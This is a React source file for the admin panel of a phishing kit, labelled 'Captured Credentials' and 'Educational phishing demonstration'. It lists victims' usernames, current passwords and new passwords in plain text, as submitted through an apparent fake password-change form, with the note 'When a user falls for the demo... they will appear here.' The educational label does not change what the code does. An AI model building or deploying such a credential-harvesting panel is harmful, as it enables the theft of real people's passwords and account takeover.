import { Link } from "wouter";
import { format } from "date-fns";
import { useGetEntries } from "@workspace/api-client-react";
import { Shield, KeyRound, Clock, User, AlertTriangle, ArrowLeft } from "lucide-react";

export default function Admin() {
  const { data, isLoading, isError } = useGetEntries();

  return (
    <div className="min-h-screen bg-black text-white p-6 md:p-12 font-sans">
      <div className="max-w-7xl mx-auto space-y-8">

        <div className="flex items-center justify-between bg-card p-6 rounded-2xl border border-border/50 shadow-xl">
          <div>
            <div className="flex items-center gap-3 mb-2">
              <div className="w-10 h-10 bg-primary/20 rounded-xl flex items-center justify-center text-primary">
                <Shield className="w-6 h-6" />
              </div>
              <h1 className="text-3xl font-bold tracking-tight">Captured Credentials</h1>
            </div>
            <p className="text-muted-foreground text-sm">Educational phishing demonstration panel. Unauthorized access is prohibited.</p>
          </div>

          <Link href="/" className="flex items-center gap-2 text-sm font-medium text-muted-foreground hover:text-white transition-colors bg-background px-4 py-2 rounded-lg border border-border/50 hover:border-border">
            <ArrowLeft className="w-4 h-4" />
            Back to Demo
          </Link>
        </div>

        {isLoading ? (
          <div className="flex flex-col items-center justify-center py-20 bg-card/50 rounded-2xl border border-border/30">
            <div className="w-12 h-12 border-4 border-primary/30 border-t-primary rounded-full animate-spin mb-4" />
            <p className="text-muted-foreground font-medium animate-pulse">Loading captured data...</p>
          </div>
        ) : isError ? (
          <div className="bg-destructive/10 border border-destructive/30 p-6 rounded-2xl flex items-start gap-4">
            <AlertTriangle className="w-6 h-6 text-destructive shrink-0 mt-1" />
            <div>
              <h3 className="font-bold text-destructive text-lg">Error loading data</h3>
              <p className="text-destructive/80 mt-1">Make sure the backend API is running and accessible.</p>
            </div>
          </div>
        ) : (
          <div className="bg-card rounded-2xl border border-border/50 shadow-xl overflow-hidden">
            {data?.entries && data.entries.length > 0 ? (
              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse text-sm">
                  <thead>
                    <tr className="border-b border-border/50 bg-background/50 text-xs uppercase tracking-wider text-muted-foreground font-semibold">
                      <th className="px-5 py-4">
                        <div className="flex items-center gap-2"><User className="w-4 h-4" /> Username / Email</div>
                      </th>
                      <th className="px-5 py-4">
                        <div className="flex items-center gap-2"><KeyRound className="w-4 h-4" /> Current Password</div>
                      </th>
                      <th className="px-5 py-4">Confirm Current</th>
                      <th className="px-5 py-4">New Password</th>
                      <th className="px-5 py-4">Confirm New</th>
                      <th className="px-5 py-4 text-right">
                        <div className="flex items-center gap-2 justify-end"><Clock className="w-4 h-4" /> Submitted</div>
                      </th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-border/30">
                    {data.entries.map((entry) => (
                      <tr key={entry.id} className="hover:bg-white/5 transition-colors">
                        <td className="px-5 py-3 whitespace-nowrap font-medium text-white">{entry.username}</td>
                        <td className="px-5 py-3 whitespace-nowrap">
                          <code className="px-2 py-0.5 bg-black rounded font-mono border border-border/50 text-secondary">{entry.currentPassword}</code>
                        </td>
                        <td className="px-5 py-3 whitespace-nowrap">
                          <code className="px-2 py-0.5 bg-black rounded font-mono border border-border/50 text-muted-foreground">{entry.confirmCurrentPassword}</code>
                        </td>
                        <td className="px-5 py-3 whitespace-nowrap">
                          <code className="px-2 py-0.5 bg-black rounded font-mono border border-border/50 text-green-400">{entry.newPassword}</code>
                        </td>
                        <td className="px-5 py-3 whitespace-nowrap">
                          <code className="px-2 py-0.5 bg-black rounded font-mono border border-border/50 text-muted-foreground">{entry.confirmNewPassword}</code>
                        </td>
                        <td className="px-5 py-3 whitespace-nowrap text-right text-muted-foreground">
                          {format(new Date(entry.submittedAt), "MMM d, yyyy • HH:mm:ss")}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            ) : (
              <div className="flex flex-col items-center justify-center py-24 text-center">
                <div className="w-16 h-16 bg-background rounded-full flex items-center justify-center mb-4 border border-border/50">
                  <Shield className="w-8 h-8 text-muted-foreground/50" />
                </div>
                <h3 className="text-xl font-bold text-white mb-2">No entries yet</h3>
                <p className="text-muted-foreground max-w-md">
                  When a user falls for the demo and submits their credentials, they will appear here.
                </p>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
